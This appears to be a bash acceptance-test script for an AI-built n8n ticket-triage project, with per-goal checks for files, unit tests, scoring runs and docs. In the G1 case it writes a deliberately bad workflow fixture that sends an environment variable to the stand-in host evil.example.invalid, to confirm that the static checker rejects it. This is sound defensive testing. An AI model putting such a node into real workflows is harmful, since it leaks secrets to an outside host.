#!/usr/bin/env bash
# Acceptance tests, one case per goal in GOALS.md.  Usage: bash scripts/accept.sh G<n> | plan | all
# Exit 0 only if every check for that goal passes. The overnight worker may not edit this file.
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"
G="${1:-}"
FAILS=0
step() { echo "--- [$G] $*"; }
run() { step "$*"; "$@" || { echo "ACCEPT FAIL [$G]: $*"; FAILS=$((FAILS + 1)); }; }
ut() { run python3 -m unittest -v "$@"; }
chk() { run python3 scripts/checks.py "$@"; }
need() { for f in "$@"; do [ -e "$f" ] || { echo "ACCEPT FAIL [$G]: missing $f"; FAILS=$((FAILS + 1)); }; done; }
common() { run python3 -m compileall -q src tests; }
latest_run() { ls -d evals/runs/"$1"-* 2>/dev/null | sort | tail -n 1; }

case "$G" in
  plan)
    need AGENTS.md CLAUDE.md README.md GOALS.md HANDOFF.md OPEN_QUESTIONS.md RUN_OVERNIGHT.md overnight.conf \
         .env.example .gitignore docs/ARCHITECTURE.md docs/HARNESS_SPEC.md docs/SECURITY_CONTROLS.md docs/DECISIONS.md \
         .ai/STATUS.md .ai/HANDOFF.md .ai/ROUTING.md specs/t4-triage/spec.md evals/README.md \
         scripts/preflight.sh scripts/overnight.sh scripts/guard.sh scripts/status.py scripts/morning_report.py \
         scripts/init_env.py scripts/claude-overnight-settings.json
    n_adr=$(ls docs/adr/ADR-00*.md 2>/dev/null | wc -l | tr -d ' ')
    [ "$n_adr" -ge 5 ] && [ "$n_adr" -le 7 ] || { echo "ACCEPT FAIL [plan]: $n_adr ADR files (want 5-7)"; FAILS=$((FAILS + 1)); }
    for s in scripts/*.sh; do run bash -n "$s"; done
    run python3 -m py_compile scripts/checks.py scripts/status.py scripts/morning_report.py scripts/init_env.py
    run python3 -c "import json; json.load(open('scripts/claude-overnight-settings.json'))"
    run python3 scripts/status.py check
    chk banned
    chk words README.md 200
    chk contains README.md "plan only"
    ;;
  G1)
    need src/common/norm.py src/checks/static_checks.py tests/test_norm.py tests/test_static_checks.py
    ut tests.test_norm tests.test_static_checks
    common
    step "static checker must reject a bad workflow in --strict"
    tmp="$(mktemp -d)"
    printf '%s' '{"nodes":[{"name":"Bad","type":"n8n-nodes-base.httpRequest","retryOnFail":true,"maxTries":9,"parameters":{"url":"=https://evil.example.invalid/{{$env.X}}","options":{}}}]}' > "$tmp/bad.json"
    if python3 -m src.checks.static_checks --strict --out "$tmp/out.json" "$tmp/bad.json" >/dev/null 2>&1; then
      echo "ACCEPT FAIL [G1]: static checker accepted a bad workflow"; FAILS=$((FAILS + 1))
    fi
    rm -rf "$tmp"
    ;;
  G2)
    need src/fixtures/make_tickets.py src/fixtures/hard_cases.json evals/inputs/manifest.csv tests/test_fixtures.py
    run python3 -m src.fixtures.make_tickets --check
    chk gold
    ut tests.test_fixtures
    common
    ;;
  G3)
    need src/score/score.py src/score/tune.py src/score/check_run.py src/score/report.py
    ut tests.test_score tests.test_tune tests.test_check_run tests.test_replay_regression
    common
    ;;
  G4)
    command -v node >/dev/null || { echo "ACCEPT FAIL [G4]: node not found (parity tests need it)"; FAILS=$((FAILS + 1)); }
    need src/common/redact.py src/common/inject.py src/js/redact.js src/js/inject.js
    ut tests.test_redact tests.test_inject
    run python3 -m src.common.redact --audit evals/gold
    run python3 -m src.common.inject --audit evals/gold --split dev
    common
    ;;
  G5)
    need src/sink/server.py tests/test_sink.py
    ut tests.test_sink
    common
    ;;
  G6)
    need src/replay/run.py tests/test_replay.py
    ut tests.test_replay
    run python3 -m src.replay.run --help
    common
    ;;
  G7)
    need workflows/t4-triage.json workflows/t4-error-handler.json tests/test_workflow.py
    run python3 -m src.checks.static_checks --strict --out /dev/null workflows/t4-triage.json
    run python3 -m src.checks.static_checks --strict --out /dev/null workflows/t4-error-handler.json
    ut tests.test_workflow
    run python3 -m src.score.check_run --phase slice --latest
    common
    ;;
  G8)
    run python3 -m src.checks.static_checks --strict --out /dev/null workflows/t4-triage.json
    run python3 -m src.checks.static_checks --strict --out /dev/null workflows/t4-error-handler.json
    ut tests.test_workflow
    run python3 -m src.score.check_run --phase smoke --latest
    common
    ;;
  G9)
    need evals/thresholds.json evals/threshold_sweep.csv
    run python3 -m src.score.tune --verify
    chk csv-rows evals/threshold_sweep.csv 156
    ut tests.test_tune tests.test_workflow
    ;;
  G10)
    need evals/scorecard.csv evals/confusion_category.csv evals/confusion_priority.csv evals/cost_ledger.csv
    run python3 -m src.score.check_run --phase test --latest
    chk csv-rows evals/scorecard.csv 100 --header scorecard
    ut tests.test_replay_regression
    chk spend
    ;;
  G11)
    need src/replay/attacks.py tests/test_attacks.py
    ut tests.test_attacks
    run python3 -m src.score.check_run --phase attack --latest
    r="$(latest_run attack)"; need "$r/attack_results.json"
    chk spend
    ;;
  G12)
    need docs/RUNBOOK.md docs/LIMITATIONS.md
    chk words docs/RUNBOOK.md 600
    chk headings docs/RUNBOOK.md "Start" "Daily checks" "Working the review queue" "When the model is down" \
        "When Jira or Slack is down" "Cap reached" "Duplicate issue found" "Re-tuning thresholds" "Rotating secrets" \
        "Pruning n8n executions"
    chk bullets docs/LIMITATIONS.md 6
    chk banned docs/RUNBOOK.md docs/LIMITATIONS.md
    ;;
  G13)
    need evals/eval_report.json evals/SHA256SUMS evals/security_findings.json evals/security_findings.md evals/findings.md
    run python3 -m src.score.report --verify
    run python3 -m src.score.report --verify-findings
    chk table-rows evals/security_findings.md "SEC-" 20
    chk headings --ordered evals/findings.md "What was tested" "Headline" "Per-class metrics" "Confusion" "Thresholds" \
        "Replay proof" "Cost" "Failure codes" "Trace notes" "Security findings" "OWASP" "Residual risk" "What this is not"
    chk banned evals/findings.md evals/security_findings.md
    ;;
  G14)
    need README.md evals/eval_report.json
    chk words README.md 200
    chk contains README.md "plan only" --absent
    chk links README.md
    chk numbers-in-report README.md evals/eval_report.json --section Results
    chk banned README.md
    ;;
  all)
    for g in G1 G2 G3 G4 G5 G6 G7 G8 G9 G10 G11 G12 G13 G14; do
      if bash "$0" "$g" >/dev/null 2>&1; then echo "$g PASS"; else echo "$g FAIL"; fi
    done
    exit 0
    ;;
  *)
    echo "usage: bash scripts/accept.sh G1..G14 | plan | all"; exit 2 ;;
esac

if [ "$FAILS" -eq 0 ]; then echo "ACCEPT PASS [$G]"; exit 0; fi
echo "ACCEPT FAIL [$G]: $FAILS check(s) failed"; exit 1
